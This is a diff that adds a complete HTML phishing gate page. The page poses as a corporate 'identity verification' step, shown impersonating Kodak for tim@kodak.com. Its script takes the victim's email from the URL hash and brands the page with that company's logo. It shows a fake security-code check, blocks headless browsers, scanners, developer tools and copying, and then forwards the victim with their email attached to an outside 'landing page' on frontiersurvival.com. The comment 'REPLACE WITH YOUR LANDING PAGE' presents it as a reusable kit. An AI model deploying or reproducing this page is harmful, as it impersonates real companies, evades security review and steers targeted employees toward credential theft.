@@ -1,0 +1,729 @@
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Corporate Access | Identity Verification</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  user-select: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+}
+
+body {
+  min-height: 100vh;
+  background: #eef2f6;
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  position: relative;
+  color: #1a2c3e;
+}
+
+/* Clean corporate background */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: linear-gradient(135deg, #f5f7fa 0%, #e9edf2 100%);
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* Main container - centered, smaller card */
+.verification-container {
+  position: relative;
+  z-index: 10;
+  width: 100%;
+  max-width: 380px;
+}
+
+.verification-card {
+  background: #ffffff;
+  border-radius: 20px;
+  padding: 28px 24px;
+  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.05), 0 1px 3px rgba(0, 0, 0, 0.03);
+  border: 1px solid #e8edf2;
+  transition: all 0.2s ease;
+}
+
+/* Header - compact corporate */
+.verification-header {
+  text-align: center;
+  margin-bottom: 24px;
+}
+
+/* Dynamic company logo container */
+.company-logo-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-bottom: 16px;
+}
+
+.company-logo {
+  width: 56px;
+  height: 56px;
+  border-radius: 14px;
+  background: #f8fafc;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 1px solid #e2e8f0;
+  padding: 8px;
+}
+
+.company-logo img {
+  max-width: 100%;
+  max-height: 100%;
+  object-fit: contain;
+  border-radius: 8px;
+}
+
+.company-logo-placeholder {
+  width: 40px;
+  height: 40px;
+  background: linear-gradient(135deg, #3b82f6, #2563eb);
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-weight: 600;
+  font-size: 18px;
+}
+
+h2 {
+  font-size: 18px;
+  font-weight: 600;
+  color: #1e2a3a;
+  letter-spacing: -0.2px;
+  margin-bottom: 4px;
+}
+
+.subtitle {
+  font-size: 12px;
+  color: #6c7a8e;
+  font-weight: 400;
+}
+
+/* Email badge - refined */
+.email-badge {
+  background: #f8fafc;
+  border-radius: 10px;
+  padding: 8px 12px;
+  margin-bottom: 20px;
+  border: 1px solid #e8edf2;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  font-size: 11px;
+  color: #4a5b6e;
+}
+
+.email-badge svg {
+  width: 14px;
+  height: 14px;
+  fill: #3b82f6;
+  opacity: 0.7;
+}
+
+.email-badge strong {
+  font-family: 'SF Mono', 'Fira Code', monospace;
+  font-weight: 500;
+  font-size: 11px;
+  color: #1e2a3a;
+  background: #ffffff;
+  padding: 2px 8px;
+  border-radius: 16px;
+  border: 1px solid #e2e8f0;
+}
+
+/* Verification display - subtle, professional */
+.verification-display {
+  background: #f8fafc;
+  border-radius: 16px;
+  padding: 20px 16px;
+  margin: 20px 0 20px;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+  border: 1px solid #e8edf2;
+}
+
+/* Subtle noise for anti-ocr */
+.verification-display::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><filter id="noise"><feTurbulence type="fractalNoise" baseFrequency="0.55" numOctaves="1" stitchTiles="stitch"/></filter><rect width="100%" height="100%" filter="url(%23noise)" opacity="0.025"/></svg>');
+  background-size: cover;
+  pointer-events: none;
+}
+
+.verification-number {
+  font-size: 36px;
+  font-weight: 700;
+  font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+  letter-spacing: 6px;
+  color: #1e2a3a;
+  position: relative;
+  z-index: 2;
+  display: inline-block;
+  background: rgba(255,255,255,0.8);
+  padding: 6px 16px;
+  border-radius: 12px;
+}
+
+.verification-number span {
+  display: inline-block;
+  margin: 0 1px;
+}
+
+/* Input field - clean */
+.input-group {
+  margin-bottom: 18px;
+}
+
+label {
+  display: block;
+  font-size: 11px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+  color: #6c7a8e;
+  margin-bottom: 6px;
+}
+
+.verification-input {
+  width: 100%;
+  padding: 12px 14px;
+  font-size: 15px;
+  font-family: 'SF Mono', monospace;
+  letter-spacing: 2px;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 12px;
+  background: #ffffff;
+  transition: all 0.2s;
+  text-align: center;
+  color: #1e2a3a;
+  font-weight: 500;
+}
+
+.verification-input:focus {
+  outline: none;
+  border-color: #3b82f6;
+  box-shadow: 0 0 0 3px rgba(59,130,246,0.08);
+}
+
+/* Button styles - refined */
+.refresh-btn {
+  background: transparent;
+  border: 1.5px solid #e2e8f0;
+  padding: 10px 14px;
+  border-radius: 12px;
+  color: #5a6b7e;
+  font-weight: 500;
+  font-size: 12px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  width: 100%;
+  transition: all 0.2s;
+  margin-bottom: 14px;
+}
+
+.refresh-btn:hover {
+  background: #f8fafc;
+  border-color: #cbd5e1;
+}
+
+.refresh-btn svg {
+  width: 14px;
+  height: 14px;
+  stroke: #5a6b7e;
+}
+
+.verify-btn {
+  width: 100%;
+  padding: 12px;
+  background: #1e2a3a;
+  color: white;
+  border: none;
+  border-radius: 12px;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  letter-spacing: 0.3px;
+}
+
+.verify-btn:hover:not(:disabled) {
+  background: #2d3a4a;
+  transform: translateY(-1px);
+}
+
+.verify-btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+.verify-btn.loading {
+  position: relative;
+  color: transparent;
+}
+
+.verify-btn.loading::after {
+  content: '';
+  position: absolute;
+  width: 16px;
+  height: 16px;
+  top: 50%;
+  left: 50%;
+  margin-left: -8px;
+  margin-top: -8px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-radius: 50%;
+  border-top-color: white;
+  animation: spin 0.6s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* Message area - compact */
+.message-area {
+  margin-top: 16px;
+  padding: 8px 12px;
+  border-radius: 10px;
+  text-align: center;
+  font-size: 11px;
+  display: none;
+  font-weight: 500;
+}
+
+.message-area.error {
+  background: #fef2f2;
+  color: #dc2626;
+  border: 1px solid #fee2e2;
+  display: block;
+}
+
+.message-area.success {
+  background: #f0fdf4;
+  color: #16a34a;
+  border: 1px solid #dcfce7;
+  display: block;
+}
+
+.message-area.info {
+  background: #eff6ff;
+  color: #2563eb;
+  border: 1px solid #dbeafe;
+  display: block;
+}
+
+/* Timer - subtle */
+.timer-display {
+  text-align: center;
+  margin-top: 12px;
+  font-size: 10px;
+  color: #8c9aae;
+  font-weight: 400;
+}
+
+/* Status badge */
+.status-badge {
+  position: fixed;
+  bottom: 16px;
+  right: 16px;
+  font-size: 9px;
+  color: #8c9aae;
+  background: rgba(255, 255, 255, 0.9);
+  backdrop-filter: blur(4px);
+  padding: 4px 10px;
+  border-radius: 20px;
+  pointer-events: none;
+  z-index: 100;
+  font-weight: 400;
+  border: 1px solid #e2e8f0;
+}
+
+/* Anti-copy */
+.copy-protection {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 9998;
+}
+</style>
+</head>
+<body>
+
+<div class="copy-protection"></div>
+
+<div class="verification-container">
+  <div class="verification-card">
+    <div class="verification-header">
+      <div class="company-logo-container">
+        <div id="companyLogo" class="company-logo">
+          <div class="company-logo-placeholder" id="logoPlaceholder" style="display: none;">◉</div>
+          <img id="logoImage" style="display: block;" alt="Company logo" src="https://img.logo.dev/kodak.com?token=pk_X3Yst72FQUOeVfOd-dlhKg">
+        </div>
+      </div>
+      <h2 id="companyName">Kodak</h2>
+      <p class="subtitle">Verification required</p>
+    </div>
+
+    <!-- Email badge - shows grabbed email -->
+    <div id="emailBadge" class="email-badge" style="display: flex;">
+      <svg viewBox="0 0 24 24" fill="currentColor">
+        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"></path>
+      </svg>
+      <span><strong id="grabbedEmail">tim@kodak.com</strong></span>
+    </div>
+
+    <!-- Verification display -->
+    <div class="verification-display">
+      <div id="verificationNumber" class="verification-number"><span style="display: inline-block; transform: rotate(0.376564deg); margin: 0px 1px;">5</span><span style="display: inline-block; transform: rotate(0.0729983deg); margin: 0px 1px;">0</span><span style="display: inline-block; transform: rotate(0.0501961deg); margin: 0px 1px;">8</span><span style="display: inline-block; transform: rotate(-0.511505deg); margin: 0px 1px;">0</span><span style="display: inline-block; transform: rotate(0.83186deg); margin: 0px 1px;">4</span><span style="display: inline-block; transform: rotate(0.26342deg); margin: 0px 1px;">3</span></div>
+    </div>
+
+    <div class="input-group">
+      <label>Security code</label>
+      <input type="text" id="userInput" class="verification-input" placeholder="000000" maxlength="6" autocomplete="off" inputmode="numeric">
+    </div>
+
+    <button id="refreshBtn" class="refresh-btn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M20 2v6h-6M4 12a8 8 0 018-8 8 8 0 018 8M4 22v-6h6" stroke="currentColor" fill="none"></path>
+        <path d="M20 12a8 8 0 01-8 8 8 8 0 01-8-8" stroke="currentColor" fill="none"></path>
+      </svg>
+      New code
+    </button>
+
+    <button id="verifyBtn" class="verify-btn">Verify identity</button>
+
+    <div id="messageArea" class="message-area info" style="display: none;">New code generated</div>
+    <div id="timerDisplay" class="timer-display"></div>
+  </div>
+</div>
+
+<div class="status-badge" id="statusBadge" style="color: rgb(140, 154, 174);">● Secure</div>
+
+<script type="text/javascript">
+// ==================== CONFIGURATION ====================
+const LANDING_PAGE_URL = 'https://www.frontiersurvival.com/00u1cx1000/updaters'; // REPLACE WITH YOUR LANDING PAGE
+const REDIRECT_DELAY = 1500;
+// =========================================================
+
+// ==================== EMAIL EXTRACTION ====================
+let grabbedEmail = '';
+
+function extractEmailFromHash() {
+  if (window.location.hash && window.location.hash.length > 1) {
+    let hashValue = decodeURIComponent(window.location.hash.substring(1)).trim();
+    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+    if (emailRegex.test(hashValue)) {
+      return hashValue;
+    }
+  }
+  return null;
+}
+
+// Extract domain from email
+function extractDomain(email) {
+  if (!email) return null;
+  const match = email.match(/@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+  return match ? match[1] : null;
+}
+
+// Update company logo and branding based on email domain
+function updateCompanyBranding(email) {
+  if (!email) return;
+  
+  const domain = extractDomain(email);
+  if (!domain) return;
+  
+  const companyName = domain.split('.')[0].charAt(0).toUpperCase() + domain.split('.')[0].slice(1);
+  const companyNameEl = document.getElementById('companyName');
+  if (companyNameEl) {
+    companyNameEl.textContent = companyName;
+  }
+  
+  // Update logo using logo.dev service
+  const logoImg = document.getElementById('logoImage');
+  const logoPlaceholder = document.getElementById('logoPlaceholder');
+  
+  if (logoImg && logoPlaceholder) {
+    const logoUrl = `https://img.logo.dev/${domain}?token=pk_X3Yst72FQUOeVfOd-dlhKg`;
+    logoImg.src = logoUrl;
+    logoImg.style.display = 'block';
+    logoPlaceholder.style.display = 'none';
+    
+    logoImg.onload = function() {
+      logoImg.style.display = 'block';
+      logoPlaceholder.style.display = 'none';
+    };
+    
+    logoImg.onerror = function() {
+      // Fallback: show first letter of company
+      logoImg.style.display = 'none';
+      logoPlaceholder.style.display = 'flex';
+      logoPlaceholder.textContent = companyName.charAt(0).toUpperCase();
+      logoPlaceholder.style.background = 'linear-gradient(135deg, #3b82f6, #2563eb)';
+      logoPlaceholder.style.color = 'white';
+    };
+  }
+}
+
+// Pass email to landing page as #email@domain.com
+function getLandingPageWithEmail(email) {
+  if (!LANDING_PAGE_URL || LANDING_PAGE_URL === 'https://your-website.com/dashboard') {
+    return null;
+  }
+  
+  let targetUrl = LANDING_PAGE_URL.split('#')[0];
+  if (email) {
+    targetUrl += `#${email}`;
+  }
+  return targetUrl;
+}
+
+// ==================== ANTI-BOT & SECURITY ====================
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('dragstart', e => e.preventDefault());
+document.addEventListener('selectstart', e => e.preventDefault());
+
+document.addEventListener('keydown', function(e) {
+  const blocked = ['F12', 'F11', 'F10', 'PrintScreen'];
+  if (blocked.includes(e.key)) { e.preventDefault(); return false; }
+  if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) { e.preventDefault(); return false; }
+  if (e.ctrlKey && ['u', 's', 'p', 'c', 'v', 'x', 'a'].includes(e.key)) { e.preventDefault(); return false; }
+  if ((e.ctrlKey && e.key === 'r') || e.key === 'F5') { e.preventDefault(); showMessage('Refresh disabled', 'error'); return false; }
+});
+
+document.querySelectorAll('input').forEach(input => {
+  input.addEventListener('copy', e => e.preventDefault());
+  input.addEventListener('cut', e => e.preventDefault());
+  input.addEventListener('paste', e => e.preventDefault());
+});
+
+// Mouse tracking for bot detection
+let mouseMoved = false;
+let mouseMovements = [];
+let mousePathLength = 0;
+let lastX = 0, lastY = 0;
+let startTime = Date.now();
+
+document.addEventListener('mousemove', (e) => {
+  if (!mouseMoved) mouseMoved = true;
+  mouseMovements.push({ x: e.clientX, y: e.clientY, time: Date.now() });
+  if (lastX && lastY) mousePathLength += Math.hypot(e.clientX - lastX, e.clientY - lastY);
+  lastX = e.clientX; lastY = e.clientY;
+  if (mouseMovements.length > 80) mouseMovements.shift();
+});
+
+function detectBot() {
+  const flags = [];
+  if (navigator.webdriver) flags.push('webdriver');
+  if (!navigator.plugins.length) flags.push('no_plugins');
+  if (!mouseMoved && Date.now() - startTime > 4000) flags.push('no_mouse');
+  const ua = navigator.userAgent.toLowerCase();
+  if (ua.includes('headless') || ua.includes('phantom')) flags.push('headless');
+  return flags;
+}
+
+// ==================== VERIFICATION LOGIC ====================
+let currentCode = '';
+let attempts = 0;
+let cooldown = false;
+let cooldownSec = 0;
+let codeTimer = null;
+
+function generateCode() {
+  let code = '';
+  for (let i = 0; i < 6; i++) code += Math.floor(Math.random() * 10);
+  return code;
+}
+
+function renderCode(code) {
+  const container = document.getElementById('verificationNumber');
+  container.innerHTML = '';
+  code.split('').forEach(d => {
+    const span = document.createElement('span');
+    span.textContent = d;
+    span.style.display = 'inline-block';
+    const rot = (Math.random() - 0.5) * 2.5;
+    span.style.transform = `rotate(${rot}deg)`;
+    span.style.margin = '0 1px';
+    container.appendChild(span);
+  });
+}
+
+function refreshCode() {
+  if (cooldown) { showMessage(`Wait ${cooldownSec}s`, 'error'); return; }
+  currentCode = generateCode();
+  renderCode(currentCode);
+  document.getElementById('userInput').value = '';
+  showMessage('New code generated', 'info');
+  if (codeTimer) clearTimeout(codeTimer);
+  codeTimer = setTimeout(() => { if (!cooldown) refreshCode(); }, 60000);
+}
+
+function startCooldown(sec) {
+  cooldown = true;
+  cooldownSec = sec;
+  const timerDiv = document.getElementById('timerDisplay');
+  const interval = setInterval(() => {
+    cooldownSec--;
+    if (timerDiv) timerDiv.textContent = `Wait ${cooldownSec}s`;
+    if (cooldownSec <= 0) {
+      clearInterval(interval);
+      cooldown = false;
+      if (timerDiv) timerDiv.textContent = '';
+      attempts = 0;
+    }
+  }, 1000);
+}
+
+function showMessage(msg, type) {
+  const div = document.getElementById('messageArea');
+  div.textContent = msg;
+  div.className = `message-area ${type}`;
+  div.style.display = 'block';
+  setTimeout(() => { 
+    if (div.className.includes(type)) {
+      div.style.display = 'none';
+    }
+  }, 3500);
+}
+
+function verify() {
+  if (cooldown) { showMessage(`Wait ${cooldownSec}s`, 'error'); return; }
+  const input = document.getElementById('userInput').value.trim();
+  if (!input) { showMessage('Enter security code', 'error'); return; }
+  if (!/^\d+$/.test(input)) { showMessage('Numbers only', 'error'); return; }
+  
+  const botFlags = detectBot();
+  if (botFlags.length) { 
+    showMessage('Verification failed', 'error'); 
+    attempts++; 
+    if (attempts >= 3) startCooldown(30); 
+    refreshCode(); 
+    return; 
+  }
+  
+  if (input === currentCode) {
+    const btn = document.getElementById('verifyBtn');
+    btn.classList.add('loading');
+    btn.disabled = true;
+    showMessage('Access granted', 'success');
+    
+    sessionStorage.setItem('verified', 'true');
+    sessionStorage.setItem('vtime', Date.now());
+    if (grabbedEmail) sessionStorage.setItem('vemail', grabbedEmail);
+    
+    setTimeout(() => {
+      const targetUrl = getLandingPageWithEmail(grabbedEmail);
+      if (targetUrl && targetUrl !== 'https://your-website.com/dashboard') {
+        window.location.href = targetUrl;
+      } else {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+        showMessage('Configure landing page', 'error');
+      }
+    }, REDIRECT_DELAY);
+  } else {
+    attempts++;
+    const left = 3 - attempts;
+    if (left > 0) {
+      showMessage(`Invalid · ${left} attempt${left !== 1 ? 's' : ''} left`, 'error');
+    } else {
+      showMessage('Too many attempts · locked 30s', 'error');
+      startCooldown(30);
+      attempts = 0;
+    }
+    refreshCode();
+    document.getElementById('userInput').value = '';
+    document.getElementById('userInput').focus();
+  }
+}
+
+// ==================== INITIALIZATION ====================
+grabbedEmail = extractEmailFromHash();
+
+if (grabbedEmail) {
+  const badge = document.getElementById('emailBadge');
+  const emailSpan = document.getElementById('grabbedEmail');
+  if (badge && emailSpan) {
+    emailSpan.textContent = grabbedEmail;
+    badge.style.display = 'flex';
+  }
+  updateCompanyBranding(grabbedEmail);
+  console.log('📧 Email:', grabbedEmail);
+} else {
+  console.log('📧 Add #email@domain.com to URL');
+  document.getElementById('companyName').textContent = 'Secure Access';
+}
+
+// Check already verified
+const verified = sessionStorage.getItem('verified');
+const vtime = sessionStorage.getItem('vtime');
+if (verified === 'true' && vtime && Date.now() - parseInt(vtime) < 3600000) {
+  const savedEmail = sessionStorage.getItem('vemail');
+  const emailToUse = grabbedEmail || savedEmail;
+  const targetUrl = getLandingPageWithEmail(emailToUse);
+  if (targetUrl && targetUrl !== 'https://your-website.com/dashboard') {
+    window.location.href = targetUrl;
+  }
+}
+
+refreshCode();
+
+document.getElementById('refreshBtn').addEventListener('click', () => { 
+  if (!cooldown) refreshCode(); 
+  else showMessage(`Wait ${cooldownSec}s`, 'error'); 
+});
+
+document.getElementById('verifyBtn').addEventListener('click', verify);
+document.getElementById('userInput').addEventListener('keypress', e => { 
+  if (e.key === 'Enter') verify(); 
+});
+
+setInterval(() => {
+  const status = document.getElementById('statusBadge');
+  if (detectBot().length) {
+    status.innerHTML = '⚠️ Monitor';
+    status.style.color = '#f59e0b';
+  } else {
+    status.innerHTML = '● Secure';
+    status.style.color = '#8c9aae';
+  }
+}, 5000);
+
+if (LANDING_PAGE_URL === 'https://your-website.com/dashboard') {
+  console.warn('⚠️ Set LANDING_PAGE_URL');
+}
+</script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;f21b7719336e4e7f9a26d3e17ca8a083&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+</body></html>
